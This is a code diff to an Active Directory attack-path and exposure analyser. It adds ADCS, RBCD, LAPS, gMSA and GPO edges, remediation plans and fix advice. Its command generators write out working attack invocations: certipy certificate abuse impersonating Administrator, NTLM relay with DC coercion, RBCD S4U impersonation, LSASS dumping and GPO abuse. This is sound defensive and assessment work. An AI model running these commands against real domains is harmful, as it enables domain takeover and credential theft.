@@ -19,6 +19,13 @@ Edge sources (all from data the parsers already produce):
   ConstrainedDeleg    principal -> target          (S4U impersonation — INFERRED)
   Reaches             vantage   -> web app         (reachability, NOT control)
   ExecutesAs          web app   -> account         (act with the account's privileges)
+  AllowedToAct        principal -> computer        (RBCD already configured — INFERRED)
+  HasSIDHistory       principal -> principal       (carries the other's SID and rights)
+  ReadLAPSPassword    principal -> computer        (read the local admin password)
+  ReadGMSAPassword    principal -> gMSA account    (read the managed password)
+  GPLink              GPO       -> user/computer   (the GPO applies to it — INFERRED:
+                                                    security filtering isn't in the data)
+  ADCS                principal -> <domain>        (Certipy ESC1/2/3/4/6/7/8/11/15)
 
 The last two come from a web app import (``parsers/webapps.py``). ``Reaches``
 is the only edge that is not a control relationship: reaching an app gives
@@ -50,15 +57,41 @@ from horuseye.core.principals import BROAD_NAMES, PrincipalIndex, norm, short
 _TAKEOVER_RIGHTS = {
     "genericall", "genericwrite", "writedacl", "writeowner", "owns",
     "allextendedrights", "addkeycredentiallink", "writespn",
+    "addallowedtoact", "writeaccountrestrictions",        # configure RBCD on a computer
 }
 _RIGHT_NAMES = {
     "genericall": "GenericAll", "genericwrite": "GenericWrite", "writedacl": "WriteDacl",
     "writeowner": "WriteOwner", "owns": "Owns", "allextendedrights": "AllExtendedRights",
     "addkeycredentiallink": "AddKeyCredentialLink", "writespn": "WriteSPN",
+    "addallowedtoact": "AddAllowedToAct", "writeaccountrestrictions": "WriteAccountRestrictions",
 }
+_RBCD_RIGHTS = {"addallowedtoact", "writeaccountrestrictions"}
 
-_INFERRED_TYPES = {"Unconstrained", "ConstrainedDeleg"}
+# Certipy findings that become a route to domain control: ESC -> (trust, what it
+# lets the principal do). Others (ESC5, ESC9, ESC10, ESC12-14, ESC16) stay
+# findings only: their abuse depends on data HorusEye doesn't import.
+_ADCS_ESC = {
+    "ESC1": ("observed", "enroll with a subject of their choice and authenticate as any user"),
+    "ESC2": ("inferred", "enroll in an any-purpose template and use it as an enrollment agent"),
+    "ESC3": ("inferred", "enroll as an enrollment agent and request certificates for other users"),
+    "ESC4": ("observed", "rewrite the template to allow a chosen subject, then authenticate as any user"),
+    "ESC6": ("inferred", "supply a subject alternative name on any client-auth template"),
+    "ESC7": ("inferred", "manage the CA and issue a certificate for any user"),
+    "ESC8": ("inferred", "coerce a domain controller and relay it to HTTP web enrollment"),
+    "ESC11": ("inferred", "coerce a domain controller and relay it to the CA's RPC interface"),
+    "ESC15": ("inferred", "add an application policy to a schema v1 template (EKUwu)"),
+}
+_ADCS_RELAY = {"ESC8", "ESC11"}           # any domain user can coerce + relay
+_ADCS_ENROLL = {"ESC1", "ESC2", "ESC3", "ESC15"}
+_ADCS_CONTROL = {"ESC4", "ESC7"}
+
+# Relationship kinds that are not a change to propose: reaching an app, and a
+# GPO applying to what is linked below it (the fix is who can edit the GPO).
+_NOT_A_FIX = {"reachability", "policy", "implicit"}
+
+_INFERRED_TYPES = {"Unconstrained", "ConstrainedDeleg", "AllowedToAct"}
 _CONDITIONAL_TRUST = {"assumed", "not_assessed"}       # never on a normal route
+_TRUST_RANK = {"validated": 0, "observed": 1, "inferred": 2, "assumed": 3, "not_assessed": 4}
 
 # Remediation plan strategies, in presentation order: (id, title, summary).
 _PLAN_STRATEGIES = (
@@ -70,6 +103,23 @@ _PLAN_STRATEGIES = (
      "Cut the steps closest to the targets, so the foothold and its groups keep "
      "as much of their access as possible."),
 )
+# What the exposure number counts, said in the report so it isn't over-read.
+EXPOSURE_MODELED = [
+    "group membership", "ACL takeover (GenericAll, GenericWrite, WriteDacl, WriteOwner, Owns, "
+    "AllExtendedRights, AddKeyCredentialLink, WriteSPN)", "password reset", "add member",
+    "local admin", "sessions", "DCSync", "unconstrained, constrained and resource-based delegation",
+    "SID history", "LAPS and gMSA password readers", "GPOs applied through OU links",
+    "ADCS ESC1, ESC2, ESC3, ESC4, ESC6, ESC7, ESC8, ESC11, ESC15 (Certipy)",
+]
+EXPOSURE_NOT_MODELED = [
+    "Kerberoastable and AS-REP roastable accounts (they need a crackable password)",
+    "ADCS ESC5, ESC9, ESC10, ESC12, ESC13, ESC14, ESC16",
+    "domain and forest trusts",
+    "GPO security filtering and WMI filters",
+    "credentials outside Active Directory (scripts, shares, vaults)",
+    "sessions not seen at collection time",
+]
+
 _SOURCE, _SINK = ("<source>",), ("<sink>",)    # flow-network terminals; never a node name
 
 
@@ -93,6 +143,8 @@ class AttackGraph:
         self.is_computer: Set[str] = set()
         self._members_of: Optional[Dict[str, Set[str]]] = None   # group -> direct members, lazily
         self.vantages: Set[str] = set()        # assessment vantages from a web app import
+        self.meta: Dict[tuple, Dict] = {}      # edge_key -> extra facts (ADCS template, CA)
+        self._radj: Optional[Dict[str, List[Edge]]] = None   # reverse adjacency, lazily
         self._build()
 
     # ── Construction ────────────────────────────────────────────────────────
@@ -139,6 +191,11 @@ class AttackGraph:
                 continue
             if right == "forcechangepassword":
                 self._edge(principal, target, "ForceChangePassword", "reset password")
+            elif right == "readlapspassword":
+                self._edge(principal, target, "ReadLAPSPassword",
+                           "read the local administrator password (LAPS)", dst_is_computer=True)
+            elif right == "readgmsapassword":
+                self._edge(principal, target, "ReadGMSAPassword", "read the gMSA password")
             elif right in ("addmember", "addself"):
                 self._edge(principal, target, "AddMember", "add to group")
             elif right in _TAKEOVER_RIGHTS:
@@ -171,8 +228,103 @@ class AttackGraph:
         for dt in self._dicts(d.get("delegation_targets")):
             self._edge(dt.get("principal", ""), dt.get("target", ""),
                        "ConstrainedDeleg", "S4U impersonation")
+        for r in self._dicts(d.get("rbcd")):
+            self._edge(r.get("principal", ""), r.get("computer", ""), "AllowedToAct",
+                       "resource-based delegation (S4U impersonation)", dst_is_computer=True)
+        for h in self._dicts(d.get("sid_history")):
+            self._edge(h.get("principal", ""), h.get("target", ""), "HasSIDHistory",
+                       "SID history")
+        self._gpo_links()
+        self._adcs()
         for app in self._dicts(d.get("webapps")):
             self._webapp(app)
+        # Search observed relationships before inferred ones, so between two
+        # routes of the same length the better-evidenced one is found first.
+        for edges in self.adj.values():
+            edges.sort(key=lambda e: _TRUST_RANK.get(e.trust, 9))
+
+    def _gpo_links(self):
+        """A GPO applies to every user and computer below the OU (or domain) it
+        is linked to, except under an OU that blocks inheritance — unless the
+        link is enforced. Controlling the GPO runs code on all of them."""
+        conts = {}
+        for c in self._dicts(self.data.get("containers")):
+            if c.get("name"):
+                conts[norm(c["name"])] = c
+        for c in conts.values():
+            for link in c.get("links") or []:
+                gpo = (link or {}).get("gpo") if isinstance(link, dict) else None
+                if not gpo:
+                    continue
+                enforced = bool(link.get("enforced"))
+                where = short(c.get("name", ""))
+                seen, stack = {norm(c["name"])}, [c]
+                while stack:
+                    for child in stack.pop().get("children") or []:
+                        if not isinstance(child, dict) or not child.get("name"):
+                            continue
+                        key = norm(child["name"])
+                        if key in seen:
+                            continue
+                        seen.add(key)
+                        sub = conts.get(key)
+                        ctype = str(child.get("type") or "").lower()
+                        if sub is not None or ctype in ("ou", "container", "domain"):
+                            if sub is not None and not (sub.get("blocks_inheritance") and not enforced):
+                                stack.append(sub)
+                            continue
+                        if ctype and ctype not in ("user", "computer"):
+                            continue
+                        self._edge(gpo, child["name"], "GPLink",
+                                   f"GPO linked to {where} applies to it",
+                                   dst_is_computer=(ctype == "computer"),
+                                   trust="inferred", kind="policy",
+                                   note="Security filtering and WMI filters aren't in the data.")
+
+    @staticmethod
+    def _cert_principal(raw: str) -> str:
+        """Certipy names principals ``DOMAIN\\Name``; the graph uses ``NAME@DOMAIN``."""
+        raw = (raw or "").strip()
+        if "\\" in raw:
+            dom, _, name = raw.partition("\\")
+            return f"{name.upper()}@{dom.upper()}" if name else dom.upper()
+        return raw.upper()
+
+    def _adcs(self):
+        """Certipy findings that let a principal become any user: a route to
+        domain control. The principal is whoever Certipy names in the finding,
+        else the template's enrollment or control rights; relay findings (ESC8,
+        ESC11) need only a coercible DC, so any domain user qualifies."""
+        adcs = self.data.get("adcs") or {}
+        if not isinstance(adcs, dict):
+            return
+        for v in self._dicts(adcs.get("vulnerabilities")):
+            esc = str(v.get("esc") or "").upper()
+            spec = _ADCS_ESC.get(esc)
+            if not spec or v.get("enabled") is False:
+                continue
+            trust, what = spec
+            principals = list(v.get("principals") or [])
+            if not principals:
+                if esc in _ADCS_RELAY:
+                    principals = [f"DOMAIN USERS@{self.data.get('domain') or 'DOMAIN'}"]
+                elif esc in _ADCS_ENROLL:
+                    principals = list(v.get("enrollment_rights") or [])
+                elif esc in _ADCS_CONTROL:
+                    principals = list(v.get("control_rights") or [])
+            where = v.get("template") or v.get("ca") or ""
+            detail = f"{esc} {where}: {what}".replace(" :", ":")
+            for raw in principals:
+                name = self._cert_principal(str(raw))
+                if self.idx.classify(name) in ("noise", "tier0"):
+                    continue                  # already domain-admin-equivalent, or not a principal
+                before = len(self.adj.get(norm(name), []))
+                self._edge(name, self.domain_node, "ADCS", detail, trust=trust)
+                edges = self.adj.get(norm(name), [])
+                if len(edges) > before:
+                    self.meta[self.edge_key(edges[-1])] = {
+                        "esc": esc, "template": v.get("template") or "",
+                        "ca": v.get("ca") or (v.get("cas") or [""])[0]}
 
     def _webapp(self, app: Dict):
         """Turn an imported app's claims into edges. Claims are never changed
@@ -226,9 +378,32 @@ class AttackGraph:
         """``owned`` if given; otherwise broad groups (any domain user) plus
         any imported assessment vantages. An imported account is never a start."""
         if owned:
-            return {norm(o) for o in owned if o}
+            starts = {norm(o) for o in owned if o}
+            self._implicit_broad(starts)
+            return starts
         nodes = self._all_nodes()
         return {n for n in nodes if norm(self.display.get(n, n)) in BROAD_NAMES} | self.vantages
+
+    def _implicit_broad(self, starts: Set[str]):
+        """An owned account also holds what Domain Users / Authenticated Users /
+        Everyone can do, even though exports rarely list it as a member (it's
+        the primary group). Add that membership as an explicit step, so routes
+        open to every user are found from the foothold too. It is a fact, not
+        a fix: never proposed for removal."""
+        broad = sorted(b for b in self._broad_nodes() if self.adj.get(b))
+        added = False
+        for s in sorted(starts):
+            if s in broad:
+                continue
+            have = {e.dst for e in self.adj.get(s, [])}
+            for b in broad:
+                if b not in have:
+                    self.adj.setdefault(s, []).insert(0, Edge(
+                        s, b, "MemberOf", "every domain user is a member", "observed", kind="implicit"))
+                    self.display.setdefault(s, s)
+                    added = True
+        if added:
+            self._radj = None
 
     # ── Pathfinding ────────────────────────────────────────────────────────────
     def shortest_paths(self, owned: Optional[List[str]] = None,
@@ -281,7 +456,11 @@ class AttackGraph:
     def rel_id(e: Edge) -> str:
         """Stable, readable relationship id (e.g. ``AdminTo:WEB-SVC->WEB01.ACME.LAB``),
         so later evidence can name exactly which relationship it validates."""
-        right = f":{(e.detail or '').split(' ')[0]}" if e.type == "ACL" else ""
+        right = ""
+        if e.type == "ACL":
+            right = f":{(e.detail or '').split(' ')[0]}"
+        elif e.type == "ADCS":                 # ESC and template/CA: ADCS:ESC1/USERTPL:...
+            right = ":" + (e.detail or "").split(":")[0].strip().replace(" ", "/")
         return f"{e.type}{right}:{e.src}->{e.dst}"
 
     def _bfs(self, starts: Set[str], goals: Set[str], banned: Set[str],
@@ -344,8 +523,8 @@ class AttackGraph:
         for path in paths:
             for e in path:
                 key = self.edge_key(e)
-                if key in done or e.kind == "reachability":
-                    continue                  # reaching an app is not a fix to make
+                if key in done or e.kind in _NOT_A_FIX:
+                    continue                  # reaching an app / a GPO link is not a fix to make
                 done.add(key)
                 remains = bool(self._bfs(starts, goals, set(), banned_edges={key}))
                 out.append({
@@ -410,8 +589,8 @@ class AttackGraph:
             return []
         kept = self.parse_keep(keep)
 
-        def is_kept(e):                       # kept access, and reachability (not a fix)
-            return (e.src, e.dst) in kept or e.kind == "reachability"
+        def is_kept(e):                       # kept access, and what is not a fix
+            return (e.src, e.dst) in kept or e.kind in _NOT_A_FIX
 
         def kept_or_membership(e):
             return is_kept(e) or e.type == "MemberOf"
@@ -524,6 +703,201 @@ class AttackGraph:
         return [a[3] for u, arcs in net.items() if u not in reach for a in arcs
                 if a[3] is not None and a[0] in reach]
 
+    # ── Domain exposure ────────────────────────────────────────────────────────
+    def _reverse(self) -> Dict[str, List[Edge]]:
+        """dst -> edges into it, without unproven (assumed / not assessed) steps."""
+        if self._radj is None:
+            radj: Dict[str, List[Edge]] = {}
+            for u in sorted(self.adj):
+                for e in self.adj[u]:
+                    if e.trust not in _CONDITIONAL_TRUST:
+                        radj.setdefault(e.dst, []).append(e)
+            self._radj = radj
+        return self._radj
+
+    def _can_reach(self, goals: Set[str], banned_edges=None,
+                   parent: Optional[Dict[str, Edge]] = None,
+                   order: Optional[List[str]] = None) -> Set[str]:
+        """Every node with a route to a goal (one reverse search from the goals).
+        ``parent`` records each node's first step toward a goal, ``order`` the
+        discovery order — together, a shortest-route tree."""
+        radj = self._reverse()
+        seen, q = set(goals), deque(sorted(goals))
+        while q:
+            n = q.popleft()
+            for e in radj.get(n, ()):
+                if e.src in seen or (banned_edges and self.edge_key(e) in banned_edges):
+                    continue
+                seen.add(e.src)
+                if parent is not None:
+                    parent[e.src] = e
+                if order is not None:
+                    order.append(e.src)
+                q.append(e.src)
+        return seen
+
+    def _population(self, goals: Set[str], targets) -> List[str]:
+        """Enabled users who are not already targets (Tier-0 accounts are what
+        the routes lead to, not who is exposed)."""
+        out = set()
+        for u in self._dicts(self.data.get("users")):
+            if u.get("enabled") is False:
+                continue
+            name = u.get("name", "")
+            n = norm(name)
+            if not n or n in goals or (not targets and self.idx.is_tier0_target(name)):
+                continue
+            out.add(n)
+            if "@" in name or n not in self.display:
+                self.display.setdefault(n, name)     # users with no relationship keep their name
+        return sorted(out)
+
+    def _broad_nodes(self) -> Set[str]:
+        return {n for n in self._all_nodes() if norm(self.display.get(n, n)) in BROAD_NAMES}
+
+    def exposure(self, targets: Optional[List[str]] = None,
+                 keep: Optional[List[str]] = None,
+                 max_changes: int = 50, top: int = 5) -> Dict:
+        """How many users can reach the targets (Tier-0 by default), and the
+        fewest changes that bring that to zero.
+
+        A user is exposed if a route leads from the user — or from a group
+        every user belongs to (Domain Users, Authenticated Users, ...) — to a
+        target. The plan is a minimum cut over every exposed user at once, the
+        cut closest to the targets among the smallest ones; its changes are
+        ordered so each one removes as many users as possible, with the count
+        left after each. ``top_fixes`` are the single changes that cut off the
+        most users on their own. ``keep`` relationships are never proposed.
+        Unproven (assumed / not assessed) steps are not routes here."""
+        goals = self.goal_nodes(targets)
+        pop = self._population(goals, targets)
+        n_total = len(pop)
+        out = {
+            "computed": bool(n_total), "users_total": n_total, "users_exposed": 0,
+            "percent": 0.0, "via_broad_groups": [], "exposed_users": [],
+            "plan": None, "plan_note": "", "top_fixes": [],
+            "targets": sorted(self.display.get(g, g) for g in goals) if targets else ["Tier-0"],
+            "modeled": EXPOSURE_MODELED, "not_modeled": EXPOSURE_NOT_MODELED,
+        }
+        if not n_total:
+            out["plan_note"] = "No user list in the data, so exposure can't be measured."
+            return out
+        broad = self._broad_nodes()
+        pop_set = set(pop)
+
+        def exposed_after(banned) -> Set[str]:
+            reach = self._can_reach(goals, banned_edges=banned)
+            if any(b in reach for b in broad):
+                return pop_set
+            return pop_set & reach
+
+        parent: Dict[str, Edge] = {}
+        order: List[str] = []
+        reach = self._can_reach(goals, parent=parent, order=order)
+        broad_hit = sorted(b for b in broad if b in reach)
+        exposed = pop_set if broad_hit else pop_set & reach
+        out.update(users_exposed=len(exposed),
+                   percent=round(100.0 * len(exposed) / n_total, 1),
+                   via_broad_groups=[self.display.get(b, b) for b in broad_hit],
+                   exposed_users=sorted(self.display.get(u, u) for u in exposed))
+        if not exposed:
+            return out
+
+        kept = self.parse_keep(keep)
+
+        def protected(e):
+            return (e.src, e.dst) in kept or e.kind in _NOT_A_FIX
+
+        # Fewest changes that leave no user a route.
+        starts = (pop_set & reach) | set(broad_hit)
+        cut = self._min_cut(starts, goals, protected, "sink", max_changes)
+        if cut is None:
+            free = self._min_cut(starts, goals, lambda e: e.kind in _NOT_A_FIX, "sink", max_changes)
+            out["plan_note"] = (
+                f"No plan of at most {max_changes} changes avoids the access marked with --keep."
+                if (kept and free is not None) else
+                f"Reaching zero takes more than {max_changes} changes; start with the biggest fixes below.")
+        elif exposed_after(frozenset(self.edge_key(e) for e in cut)):
+            cut = None                         # min-cut over a broad group can't cover everyone
+            out["plan_note"] = "No single plan cuts off every user; start with the biggest fixes below."
+        if cut:
+            depth = self._depths(starts)
+            remaining = sorted(cut, key=lambda e: (depth.get(e.src, 1 << 30), self.edge_key(e)))
+            applied: Set[tuple] = set()
+            before, steps = len(exposed), []
+            while remaining:
+                if len(steps) < 12:             # greedy: the change that cuts off the most users next
+                    best = min(remaining, key=lambda e: len(exposed_after(applied | {self.edge_key(e)})))
+                else:
+                    best = remaining[0]
+                remaining.remove(best)
+                applied.add(self.edge_key(best))
+                after = len(exposed_after(applied))
+                steps.append(dict(self._change(best), users_cut_off=before - after,
+                                  users_after=after, id=self.rel_id(best)))
+                before = after
+            out["plan"] = {"changes": steps, "users_after": before,
+                           "memberships_removed": sum(1 for c in steps if c["kind"] == "membership"),
+                           "breaks_every_route": before == 0}
+
+        # Biggest single changes. Removing one relationship cuts a user off only
+        # if it is on every route of theirs, so on their shortest-route-tree path
+        # too: tree subtree sizes bound the gain, and the best bounds are checked.
+        weight = {u: 1 for u in exposed if u in reach}
+        for b in broad_hit:
+            weight[b] = weight.get(b, 0) + len(exposed)
+        acc = dict(weight)
+        for node in reversed(order):
+            e = parent.get(node)
+            if e is not None:
+                acc[e.dst] = acc.get(e.dst, 0) + acc.get(node, 0)
+        cands = sorted((e for n, e in parent.items() if acc.get(n, 0) and not protected(e)),
+                       key=lambda e: (-acc.get(e.src, 0), self.edge_key(e)))
+        best: List[tuple] = []
+        for e in cands[:60]:
+            bound = acc.get(e.src, 0)
+            if len(best) >= top and bound <= best[-1][0]:
+                break
+            gain = len(exposed) - len(exposed_after({self.edge_key(e)}))
+            if gain > 0:
+                best.append((gain, e))
+                best.sort(key=lambda t: (-t[0], self.edge_key(t[1])))
+                best = best[:top]
+        out["top_fixes"] = [dict(self._change(e), users_cut_off=g,
+                                 users_after=len(exposed) - g, id=self.rel_id(e))
+                            for g, e in best]
+        return out
+
+    def whatif_view(self, targets: Optional[List[str]] = None) -> Dict:
+        """The part of the graph that matters for exposure, compact enough to
+        embed in the explorer: every node with a route to a target, the
+        relationships between them, the targets, the broad groups and the users
+        counted. Cutting relationships and re-running the reverse search in the
+        browser gives the same number ``exposure()`` would. ``keys`` (not
+        embedded) maps each relationship back to ``edge_key``."""
+        goals = self.goal_nodes(targets)
+        pop = self._population(goals, targets)
+        reach = self._can_reach(goals)
+        nodes = sorted(reach)
+        idx = {n: i for i, n in enumerate(nodes)}
+        edges, keys = [], []
+        for u in sorted(self.adj):
+            if u not in reach or u in goals:
+                continue                       # nothing past a target matters
+            seen = set()
+            for e in self.adj[u]:
+                k = self.edge_key(e)
+                if e.trust in _CONDITIONAL_TRUST or e.dst not in reach or k in seen:
+                    continue
+                seen.add(k)
+                edges.append([idx[u], idx[e.dst], 0 if e.kind in _NOT_A_FIX else 1])
+                keys.append(k)
+        return {"nodes": [self.display.get(n, n) for n in nodes],
+                "goals": sorted(idx[g] for g in goals if g in idx),
+                "broad": sorted(idx[b] for b in self._broad_nodes() if b in idx),
+                "pop": [idx[u] for u in pop if u in idx],
+                "total": len(pop), "edges": edges, "keys": keys}
+
     def _depths(self, starts: Set[str]) -> Dict[str, int]:
         depth, q = {s: 0 for s in starts}, deque(sorted(starts))
         while q:
@@ -540,7 +914,7 @@ class AttackGraph:
             self._members_of = {}
             for edges in self.adj.values():
                 for e in edges:
-                    if e.type == "MemberOf":
+                    if e.type == "MemberOf" and e.kind != "implicit":
                         self._members_of.setdefault(e.dst, set()).add(e.src)
         out, seen, q = set(), {group}, deque([group])
         while q:
@@ -581,7 +955,22 @@ class AttackGraph:
             "ConstrainedDeleg": f"delegate to {b}",
             "Reaches": f"reach {b}",
             "ExecutesAs": f"act as {b}",
+            "AllowedToAct": f"delegate to {b} (RBCD)",
+            "HasSIDHistory": f"{b}'s rights through SID history",
+            "ReadLAPSPassword": f"read {b}'s LAPS password",
+            "ReadGMSAPassword": f"read {b}'s gMSA password",
+            "GPLink": f"apply {short(self.display.get(e.src, e.src))} to {b}",
+            "ADCS": self._adcs_right(e),
         }.get(e.type, f"{e.type} on {b}")
+
+    def _adcs_right(self, e: Edge) -> str:
+        m = self.meta.get(self.edge_key(e), {})
+        esc = m.get("esc") or (e.detail or "ADCS").split(" ")[0]
+        if m.get("template"):
+            return f"enroll in {m['template']} ({esc})"
+        if m.get("ca"):
+            return f"{esc} on CA {m['ca']}"
+        return f"certificate abuse ({esc})"
 
     def fix_text(self, e: Edge) -> str:
         a = short(self.display.get(e.src, e.src))
@@ -603,7 +992,33 @@ class AttackGraph:
             "Reaches": f"Restrict which networks can reach {a.split(':', 1)[-1]}.",
             "ExecutesAs": f"Fix the vulnerable endpoint in {a.split(':', 1)[-1]}, and run it "
                           f"under an account with only the rights it needs.",
+            "AllowedToAct": f"Clear msDS-AllowedToActOnBehalfOfOtherIdentity on {b} "
+                            f"(remove {a} from its resource-based delegation).",
+            "HasSIDHistory": f"Clear the SID history on {a} (it carries {b}'s SID).",
+            "ReadLAPSPassword": f"Remove {a}'s right to read the LAPS password of {b}.",
+            "ReadGMSAPassword": f"Remove {a} from the principals allowed to retrieve {b}'s "
+                                f"password (msDS-GroupMSAMembership).",
+            "GPLink": f"Restrict who can edit {a}, or unlink it from {b}'s OU.",
+            "ADCS": self._adcs_fix(e, a),
         }.get(e.type, "Remove this relationship.")
+
+    def _adcs_fix(self, e: Edge, a: str) -> str:
+        m = self.meta.get(self.edge_key(e), {})
+        esc, tpl, ca = m.get("esc", ""), m.get("template", ""), m.get("ca", "") or "the CA"
+        if esc in ("ESC1", "ESC2", "ESC3", "ESC15") and tpl:
+            return (f"Remove the enrollment right {a} holds on template {tpl}, or turn off "
+                    f"'Supply in the request' / require manager approval on it.")
+        if esc == "ESC4" and tpl:
+            return f"Remove the write permissions {a} holds on template {tpl}."
+        if esc == "ESC6":
+            return f"Turn off EDITF_ATTRIBUTESUBJECTALTNAME2 on {ca} and enforce strong certificate mapping."
+        if esc == "ESC7":
+            return f"Remove the ManageCA / ManageCertificates rights {a} holds on {ca}."
+        if esc == "ESC8":
+            return f"Turn off HTTP web enrollment on {ca}, or require HTTPS with EPA."
+        if esc == "ESC11":
+            return f"Enforce encryption for RPC requests on {ca} (IF_ENFORCEENCRYPTICERTREQUEST)."
+        return f"Fix the {esc or 'ADCS'} misconfiguration Certipy reported."
 
     def _change(self, e: Edge) -> Dict:
         """One change in a plan: the fix, and who loses what if it is made."""
@@ -633,6 +1048,14 @@ class AttackGraph:
             out.update(kind="configuration", affects=[src], loses=["unconstrained delegation"],
                        effect=f"{a} loses unconstrained delegation.",
                        note="Services that rely on it need constrained or resource-based delegation.")
+        elif e.type == "ADCS" and self.meta.get(self.edge_key(e), {}).get("esc") in ("ESC6", "ESC8", "ESC11"):
+            out.update(kind="configuration", affects=[], loses=[],
+                       effect="No account loses access: the change is on the certificate authority.",
+                       note="Check which applications request certificates over this interface first.")
+        elif e.type == "HasSIDHistory":
+            out.update(kind="configuration", affects=[src], loses=[self._right_text(e)],
+                       effect=f"{a} stops carrying {b}'s SID.",
+                       note="Confirm the migration that set it is finished before clearing it.")
         elif e.type == "ExecutesAs":
             out.update(kind="application", affects=[], loses=[],
                        effect="No one loses access: the fix is in the application.",
@@ -640,6 +1063,11 @@ class AttackGraph:
         else:
             right = self._right_text(e)
             members = self._members(e.src)
+            if norm(self.display.get(e.src, e.src)) in BROAD_NAMES:
+                out.update(kind="permission", affects=[src], loses=[right],
+                           effect=f"Every domain user loses only this right ({a}): {right}.",
+                           note="")
+                return out
             if members:
                 names = [short(self.display.get(m, m)) for m in members]
                 who = ", ".join(names[:4]) + (f" +{len(names) - 4} more" if len(names) > 4 else "")
@@ -663,7 +1091,7 @@ class AttackGraph:
             src, dst = self.display.get(e.src, e.src), self.display.get(e.dst, e.dst)
             steps.append({"id": self.rel_id(e), "from": src, "to": dst, "type": e.type,
                           "detail": e.detail, "trust": e.trust, "kind": e.kind,
-                          "evidence": list(e.evidence)})
+                          "evidence": list(e.evidence), "fix": self.fix_text(e)})
             commands.append(self._command(e, src, dst))
         inferred = sum(1 for e in path if e.trust == "inferred")
         start = self.display.get(path[0].src, path[0].src) if path else ""
@@ -708,11 +1136,11 @@ class AttackGraph:
         dc = self.data.get("dc_ip") or "DC_IP"
         short = dst.split("@")[0]
         return {
-            "MemberOf": f"# already inherit {dst}'s rights via group membership",
+            "MemberOf": (f"# every domain user holds {dst}'s rights" if e.kind == "implicit"
+                         else f"# already inherit {dst}'s rights via group membership"),
             "ForceChangePassword": f"net rpc password \"{short}\" -U {dom}/USER%PASS -S {dc}",
             "AddMember": f"net rpc group addmem \"{short}\" USER -U {dom}/USER%PASS -S {dc}",
-            "ACL": f"# take over {dst} (shadow creds / targeted kerberoast)\n"
-                   f"certipy shadow auto -u USER@{dom} -account {short}",
+            "ACL": self._acl_command(e, src, dst, dom, dc) if e.type == "ACL" else "",
             "AdminTo": f"nxc smb {short} -u USER -p PASS --sam  # local admin on {dst}",
             "HasSession": f"# dump LSASS on {src} to recover {dst}'s credentials\n"
                           f"nxc smb {src.split('@')[0]} -u USER -p PASS --lsa",
@@ -724,4 +1152,66 @@ class AttackGraph:
                        f"(evidence: {', '.join(e.evidence) or 'none'})",
             "ExecutesAs": f"# {src} ran code as {dst} "
                           f"(evidence: {', '.join(e.evidence) or 'not assessed'})",
+            "AllowedToAct": f"impacket-getST -spn cifs/{short} -impersonate Administrator "
+                            f"{dom}/USER:PASS -dc-ip {dc}  # RBCD already trusts {src.split('@')[0]}",
+            "HasSIDHistory": f"# {src} already holds {dst}'s rights through SID history",
+            "ReadLAPSPassword": f"nxc ldap {dc} -u USER -p PASS -M laps  # read {short}'s local admin password",
+            "ReadGMSAPassword": f"nxc ldap {dc} -u USER -p PASS --gmsa  # read {short}'s password",
+            "GPLink": f"# edit {src.split('@')[0]} to run a command on {short} "
+                      f"(e.g. an immediate scheduled task with pyGPOAbuse)",
+            "ADCS": self._adcs_command(e, dom, dc),
         }.get(e.type, f"# advance from {src} to {dst} ({e.type})")
+
+    def _acl_command(self, e: Edge, src: str, dst: str, dom: str, dc: str) -> str:
+        """The usual way to use control of the target, by what the target is."""
+        short = dst.split("@")[0]
+        right = (e.detail or "").split(" ")[0]
+        if right in _RBCD_RIGHTS or (e.dst in self.is_computer and right not in
+                                     ("addkeycredentiallink", "writespn")):
+            return (f"# configure RBCD on {dst} for a computer account you control\n"
+                    f"impacket-rbcd -delegate-from YOURPC$ -delegate-to {short}$ -action write "
+                    f"{dom}/USER:PASS -dc-ip {dc}\n"
+                    f"impacket-getST -spn cifs/{short} -impersonate Administrator "
+                    f"{dom}/YOURPC$:PASS -dc-ip {dc}")
+        if self._is_group(e.dst) and right != "writespn":
+            return f"net rpc group addmem \"{short}\" USER -U {dom}/USER%PASS -S {dc}"
+        if self._is_gpo(e.dst):
+            return (f"# edit the GPO {short} to run a command where it applies\n"
+                    f"pygpoabuse {dom}/USER:PASS -gpo-id GPO_GUID -dc-ip {dc}")
+        if right == "writespn":
+            return f"targetedKerberoast.py -d {dom} -u USER -p PASS --request-user {short}"
+        return (f"# take over {dst} (shadow creds / targeted kerberoast)\n"
+                f"certipy shadow auto -u USER@{dom} -account {short}")
+
+    def _is_group(self, node: str) -> bool:
+        if self._members_of is None:
+            self._members(node)                # builds the membership index
+        return node in (self._members_of or {}) or any(
+            norm(g.get("name", "")) == node for g in self._dicts(self.data.get("groups")))
+
+    def _is_gpo(self, node: str) -> bool:
+        return any(e.type == "GPLink" for e in self.adj.get(node, [])) or any(
+            norm(g.get("name", "")) == node for g in self._dicts(self.data.get("gpos")))
+
+    def _adcs_command(self, e: Edge, dom: str, dc: str) -> str:
+        m = self.meta.get(self.edge_key(e), {})
+        esc, tpl, ca = m.get("esc", ""), m.get("template") or "TEMPLATE", m.get("ca") or "CA_NAME"
+        auth = f"certipy auth -pfx administrator.pfx -dc-ip {dc}"
+        if esc in ("ESC1", "ESC15"):
+            return (f"certipy req -u USER@{dom} -p PASS -ca {ca} -template {tpl} "
+                    f"-upn administrator@{dom}\n{auth}")
+        if esc in ("ESC2", "ESC3"):
+            return (f"certipy req -u USER@{dom} -p PASS -ca {ca} -template {tpl}\n"
+                    f"certipy req -u USER@{dom} -p PASS -ca {ca} -template User "
+                    f"-on-behalf-of '{dom.split('.')[0]}\\Administrator' -pfx user.pfx\n{auth}")
+        if esc == "ESC4":
+            return (f"certipy template -u USER@{dom} -p PASS -template {tpl} -save-old\n"
+                    f"certipy req -u USER@{dom} -p PASS -ca {ca} -template {tpl} "
+                    f"-upn administrator@{dom}\n{auth}")
+        if esc == "ESC8":
+            return (f"certipy relay -target http://CA_HOST/certsrv/certfnsh.asp -template DomainController\n"
+                    f"# then coerce a DC to authenticate to you (PetitPotam / printerbug)")
+        if esc == "ESC11":
+            return (f"certipy relay -target rpc://CA_HOST -ca {ca} -template DomainController\n"
+                    f"# then coerce a DC to authenticate to you (PetitPotam / printerbug)")
+        return f"certipy find -u USER@{dom} -p PASS -dc-ip {dc} -vulnerable  # confirm {esc}"
